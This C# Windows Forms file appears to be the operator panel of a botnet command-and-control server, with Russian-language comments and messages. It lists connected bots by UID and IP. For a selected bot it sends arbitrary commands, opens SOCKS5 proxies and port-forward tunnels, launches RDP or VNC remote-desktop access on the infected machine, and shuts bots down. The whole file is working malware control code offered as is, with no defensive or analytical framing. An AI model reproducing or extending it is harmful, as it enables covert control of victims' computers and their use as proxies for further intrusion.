using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;

namespace Server
{
    public partial class FormMain : Form
    {
        DateTime start;
        List<ClientBot> addBots;
        List<ClientBot> delBots;
        int recvKb = 0, sendKb = 0;
        object lockAddBot, lockDelBot;

        public FormMain()
        {
            InitializeComponent();
            lockAddBot = new object();
            lockDelBot = new object();
            Program.server.AddBotEvent += new ServerBot.AddBot(server_AddBotEvent);
			Program.server.DelBotEvent += new ServerBot.DelBot(server_DelBotEvent);
            addBots = new List<ClientBot>();
            delBots = new List<ClientBot>();
/*
			string host = System.Net.Dns.GetHostName();
			foreach (System.Net.IPAddress ip in System.Net.Dns.GetHostByName(host).AddressList)
			{
				byte[] ip2 = ip.GetAddressBytes();
				if( ip2[0] != 10 )
					tbBC.Text = ip.ToString() + ":8888";
			}
*/    
			timer.Start();
            start = DateTime.Now;
			//Program.formMain = this;
        }

        void server_AddBotEvent(ClientBot bot)
        {
            lock (lockAddBot) 
            {
                addBots.Add(bot);
            }
        }

        void server_DelBotEvent(ClientBot bot)
        {
            lock (lockDelBot)
            {
                delBots.Add(bot);
            }
        }

        void UpdateCount()
        {
            tbCountBots.Text = lvBots.Items.Count.ToString();
        }

        bool IsFilter(ListViewItem lvi)
        {
            bool ret = false;
            if (tbFilterUID.Text.Length > 0 || tbFilterIP.Text.Length > 0 )
            {
                if (lvi.SubItems[0].Text.Contains(tbFilterUID.Text) &&
                    lvi.SubItems[1].Text.Contains(tbFilterIP.Text) )
                    ret = true;
            }
            return ret;
        }

        void UpdateElapsedServer()
        {
            TimeSpan ts = DateTime.Now.Subtract(start);
            tbElapsedServer.Text = ts.Hours.ToString("00") + ':' + ts.Minutes.ToString("00") + ':' + ts.Seconds.ToString("00");
            tbRecvKb.Text = recvKb.ToString();
            tbSendKb.Text = sendKb.ToString();
        }

        private void timer_Tick(object sender, EventArgs e)
        {
            recvKb = 0; sendKb = 0;
            int n = 0;
            lock (lockDelBot)
            {
                if (delBots.Count > 0)
                {
                    while (n < lvBots.Items.Count)
                    {
                        ListViewItem lvi = lvBots.Items[n];
                        ClientBot bot = (ClientBot)lvi.Tag;
                        if (delBots.Contains(bot))
                            lvBots.Items.RemoveAt(n);
                        else
                            n++;
                    }
                    delBots.Clear();
                }
            }

            for (int i = 0; i < lvBots.Items.Count; i++)
            {
                ListViewItem lvi = lvBots.Items[i];
                ClientBot bot = (ClientBot)lvi.Tag;
                TimeSpan ts = DateTime.Now.Subtract(bot.DateStart);
                lvi.SubItems[clnElapsed.DisplayIndex].Text = ts.Hours.ToString("00") + ':' + ts.Minutes.ToString("00") + ':' + ts.Seconds.ToString("00");
                lvi.SubItems[clnPorts.DisplayIndex].Text = bot.PortForward;
				lvi.SubItems[clnInfo.DisplayIndex].Text = bot.Info;
				lvi.SubItems[clnComment.DisplayIndex].Text = bot.Comment;
				int recv = bot.RecvKBytes;
                int send = bot.SendKBytes;
                lvi.SubItems[clnRecv.DisplayIndex].Text = recv.ToString();
                recvKb += recv;
                sendKb += send;
                if (IsFilter(lvi))
                    lvi.BackColor = Color.LightCoral;
                else
                    lvi.BackColor = lvBots.BackColor;
            }

            lock (lockAddBot)
            {
                if (addBots.Count > 0)
                {
                    List<ClientBot> bots = new List<ClientBot>(); //боты которые еще рано добавлять в список, так как они еще не полностью предоставили инфу о себе
                    foreach (ClientBot bot in addBots)
                        if (bot.UID != null)
                        {
                            if (bot.IsWork)
                            {
                                ListViewItem lvi = lvBots.Items.Add(bot.UID);
                                lvi.Tag = bot;
								lvi.SubItems.Add(bot.Info);
								lvi.SubItems.Add(bot.Comment);
								lvi.SubItems.Add(string.Empty);
								lvi.SubItems.Add(bot.IP);
								lvi.SubItems.Add(bot.DateStart.ToString("dd.MM.yyyy HH:mm"));
                                lvi.SubItems.Add(string.Empty);
                                int recv = bot.RecvKBytes;
                                int send = bot.SendKBytes;
                                lvi.SubItems.Add(recv.ToString());
                                recvKb += recv;
                                sendKb += send;
                            }
                        }
                        else
                            bots.Add(bot);
                    addBots = bots;
                }
            }
            UpdateElapsedServer();
            UpdateCount();
        }

        private void FormMain_FormClosed(object sender, FormClosedEventArgs e)
        {
        }

        private void btClosePortForward_Click(object sender, EventArgs e)
        {
            if (lvBots.SelectedItems.Count == 1)
            {
                ClientBot bot = (ClientBot)lvBots.SelectedItems[0].Tag;
				bot.CloseTunnelsOne();
				bot.ClosePortForward();
            }
        }

        private void btOffBot_Click(object sender, EventArgs e)
        {
            if (lvBots.SelectedItems.Count == 1)
            {
                ClientBot bot = (ClientBot)lvBots.SelectedItems[0].Tag;
                bot.OffBot(1, 0);
            }
        }

		private void btRunRDP_Click(object sender, EventArgs e)
		{
            if (lvBots.SelectedItems.Count == 1)
            {
                ClientBot bot = (ClientBot)lvBots.SelectedItems[0].Tag;
				bot.CreateService(Sender.ID_RDP, null, "RDP", Encoding.ASCII.GetBytes("127.0.0.1:3389"));
            }
		}

		private void btPortForward_Click(object sender, EventArgs e)
		{
			if (lvBots.SelectedItems.Count == 1)
			{
				ClientBot bot = (ClientBot)lvBots.SelectedItems[0].Tag;
				System.Text.RegularExpressions.Regex regex = new System.Text.RegularExpressions.Regex(@"\b(?:\d{1,3}\.){3}\d{1,3}:\d{1,5}\b");
				string port = string.Empty;
				if (regex.IsMatch(tbPortForward.Text))
					port = tbPortForward.Text.Trim();
				else
				{
					int v;
					if( (int.TryParse(tbPortForward.Text, out v)))
					{
						port = "127.0.0.1:" + v.ToString();
					}
				}
				if( port.Length > 0 )
				{
					bot.CreateTunnelOne(Sender.ID_PORTFORWARD, tbPortForward.Text.Trim(), Sender.ID_PORTFORWARD_ON_OFF, Encoding.ASCII.GetBytes(port));
				}
				else
					MessageBox.Show("Вы не указали номер порта или неверно его ввели", "Ошибка");
			}
		}

		private void btConfig_Click(object sender, EventArgs e)
		{
			FormConfig form = new FormConfig();
			form.ShowDialog();
		}

		private void lvBots_SelectedIndexChanged(object sender, EventArgs e)
		{
			if (lvBots.SelectedItems.Count == 1)
			{
				ClientBot bot = (ClientBot)lvBots.SelectedItems[0].Tag;
				tbComment.Text = bot.Comment;
			}
		}

		private void btCmdBot_Click(object sender, EventArgs e)
		{
			if (lvBots.SelectedItems.Count == 1)
			{
				ClientBot bot = (ClientBot)lvBots.SelectedItems[0].Tag;
				string s = tbCmdBot.Text.Trim();
				if (s.Length > 0)
				{

					bot.SendCmdString(Sender.ID_CMD_BOT, s);
				}
				else
					MessageBox.Show("Вы не ввели текст команды", "Ошибка");
			}
		}

		private void btStartSocks5_Click(object sender, EventArgs e)
		{
			if (lvBots.SelectedItems.Count == 1)
			{
				ClientBot bot = (ClientBot)lvBots.SelectedItems[0].Tag;
				bot.CreateTunnelOne(Sender.ID_SOCKS, string.Empty, Sender.ID_SOCKS_ON_OFF, null);
			}
		}

		private void btComment_Click(object sender, EventArgs e)
		{
			if (lvBots.SelectedItems.Count == 1)
			{
				ClientBot bot = (ClientBot)lvBots.SelectedItems[0].Tag;
				bot.Comment = tbComment.Text.Trim();
			}
		}

		private void lvBots_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
		{
			e.Graphics.FillRectangle(new SolidBrush(Color.LightBlue), e.Bounds);
			e.Graphics.DrawRectangle(new Pen(Color.Orange), e.Bounds);
			e.DrawText(TextFormatFlags.VerticalCenter | TextFormatFlags.HorizontalCenter);
		}

		private void lvBots_DrawItem(object sender, DrawListViewItemEventArgs e)
		{
			e.DrawDefault = true;
		}

		private void btRunVNC_Click(object sender, EventArgs e)
		{
			if (lvBots.SelectedItems.Count == 1)
			{
				ClientBot bot = (ClientBot)lvBots.SelectedItems[0].Tag;
				short port;
				if (short.TryParse(tbVNCPort.Text, out port))
				{
					if (port > 0)
					{
						bot.CreateService(Sender.ID_VNC, BitConverter.GetBytes(port), "VNC:" + port.ToString(), Encoding.ASCII.GetBytes("127.0.0.1:" + port.ToString()));
					}
					else
					{
						bot.CreateService(Sender.ID_VNC, BitConverter.GetBytes(port), "VNC", null);
					}
				}
			}
		}

		private void btResetLogs_Click(object sender, EventArgs e)
		{
			Program.server.streamFactory.ResetStreamLogs();
		}

	}
}
